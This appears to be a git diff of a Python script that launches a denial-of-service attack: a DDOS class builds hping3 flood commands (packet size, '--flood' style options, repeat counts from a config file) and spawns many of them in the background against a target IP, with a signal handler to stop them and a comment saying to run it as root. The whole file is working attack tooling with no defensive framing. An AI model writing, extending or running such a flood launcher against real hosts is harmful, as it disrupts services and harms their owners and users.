@@ -1,57 +1,65 @@
 import os
 import subprocess
 import signal
+import time
 import atexit
-import multiprocessing
 from config import Config
+
+'''
+Plz enter super user mode ("sudo su") to run this script.
+'''
+
+
+class bcolors:
+    # https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
 
 class DDOS():
-    def __init__(self, TARGETIPv4, ATKTOOL):
+    def __init__(self, TARGETIPv4, parameters):
+        self.startTime = time.time()
         self.responseTime = []
         self.PIDs = []
         self.ATKcommands = []
         self.TARGETIPv4 = TARGETIPv4
-        self.ATKTOOL = ATKTOOL
+        self.ATKPARAMETERS = parameters
 
-    def spawnATKprocess(self, mods=[], **kwargs):
-        data = 1000
-        freq = '--flood'
-        if self.ATKTOOL == 'hping3':
-            for i, val in enumerate(mods):
+    def spawnATKprocess(self):
+        for i, val in enumerate(self.ATKPARAMETERS):
+            for j in range(val[3]):
                 self.ATKcommands.append(
-                    f'hping3 {val} -d {data} {freq} {self.TARGETIPv4} &')
-        # elif self.ATKTOOL == 'hulk':
-        #     # not supported
-        #     subprocess.run(['hulk', '-site', 'http://' + self.TARGETIPv4, '-port',
-        #                     '80', '-threads', '1000', '-connections', '1000'])
+                    f'hping3 {val[0]} -d {val[1]} {val[2]} {self.TARGETIPv4} &')
         for i, val in enumerate(self.ATKcommands):
-            # print(val)
-            # subprocess.run(val, shell=True)
             proc = subprocess.Popen(val, shell=True)
             self.PIDs.append(proc.pid)
-
+        # register signal handler
+        signal.signal(signal.SIGINT, self.killATKprocess)
+        # register exit handler
         atexit.register(self.killATKprocess)
+        #
+        self.length = len(self.PIDs)
+        while True:
+            time.sleep(1)
 
-    def killATKprocess(self, **kwargs):
+    def killATKprocess(self):
+        print(f'{bcolors.OKGREEN}\nStop DDoS attack...{bcolors.ENDC}')
         for i, val in enumerate(self.PIDs):
             os.kill(val, signal.SIGSTOP)
-
-    def pingTarget(self, **kwargs):
-        pass
-        # https://github.com/ccampo133/Plot-Pings-in-Python/tree/master
-        # p = subprocess.Popen(['ping', self.TARGETIPv4],
-        #                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        # self.responseTime.append(p.communicate()[0])
-
-        # def EXECUTOR(self, TARGETIPv4, ATKTOOL, **kwargs):
-        #     if TARGETIPv4 == '
+        print(f'{bcolors.OKGREEN}Terminated {self.length} processes.{bcolors.ENDC}')
+        print(
+            f'{bcolors.OKGREEN}Total time: {int(time.time() - self.startTime)} seconds.{bcolors.ENDC}')
 
 
 if __name__ == '__main__':
     config = Config()
-    print(f'Start DDoS attack to {config.ATKIPv4} with {config.ATKTOOL}')
-    ddos = DDOS(config.ATKIPv4, config.ATKTOOL)
-    ddos.spawnATKprocess(mods=['', '-0', '-1', '-2'])
-    # print(ddos.ATKcommands)
-    # print(ddos.PIDs)
+    print(f'\n{bcolors.OKGREEN}Start DDoS attack to {config.ATKIPv4} with hping3.{bcolors.ENDC}\n')
+    ddos = DDOS(config.ATKIPv4, config.ATKPARAMETERS)
+    ddos.spawnATKprocess()
